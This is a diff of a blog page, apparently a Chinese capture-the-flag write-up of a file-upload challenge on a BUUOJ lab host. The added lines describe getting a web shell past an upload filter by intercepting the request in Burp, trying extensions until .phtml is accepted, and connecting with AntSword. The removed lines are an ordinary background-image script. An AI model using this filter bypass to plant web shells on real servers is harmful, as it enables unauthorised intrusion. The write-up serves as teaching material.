-<p>然后蚁剑连接<a target="_blank" rel="noopener" href="http://d87956c8-57f4-42a7-ba76-8340230a610a.node5.buuoj.cn:81/uplo4d/bd914ca4997d34857501cefab0064162.phtml">http://d87956c8-57f4-42a7-ba76-8340230a610a.node5.buuoj.cn:81/uplo4d/bd914ca4997d34857501cefab0064162.phtml</a><img src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150854121.png" alt="image-20260314150854121" style="zoom:33%;" /></p>
+<p><img loading="lazy" decoding="async" src="https://i-blog.csdnimg.cn/blog_migrate/247dd09b038060a3a5de43499bf767c0.png" alt="img"></p>
+<p>因此将木马的后缀改为jpg再上传，在bp抓包，因为要使木马发挥作用，所以尝试在bp改后缀php3,php3,php7等，但会显示bad file，直到尝试.phtml，成功<img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150717833.png" alt="image-20260314150717833"></p>
+<p>然后蚁剑连接<a target="_blank" rel="noopener" href="http://d87956c8-57f4-42a7-ba76-8340230a610a.node5.buuoj.cn:81/uplo4d/bd914ca4997d34857501cefab0064162.phtml">http://d87956c8-57f4-42a7-ba76-8340230a610a.node5.buuoj.cn:81/uplo4d/bd914ca4997d34857501cefab0064162.phtml</a><img loading="lazy" decoding="async" src="https://cdn.jsdelivr.net/gh/Septins/img/img/image-20260314150854121.png" alt="image-20260314150854121" style="zoom:33%;" /></p>
 
     </div>
     
@@ -666,15 +670,5 @@ SetHandler application/x-httpd-php
 
 
     
-<!-- hexo injector body_end start -->
-<script>
-(function () {
-    var bgs = [
-        "https://cdn.jsdelivr.net/gh/Septins/img/img/3.jpg",
-        "https://cdn.jsdelivr.net/gh/Septins/img/img/4.jpg",
-    ];
-    document.body.style.backgroundImage =
-        "url('" + bgs[Math.floor(Math.random() * bgs.length)] + "')";
-})();
-</script><!-- hexo injector body_end end --></body>
+</body>
 </html>
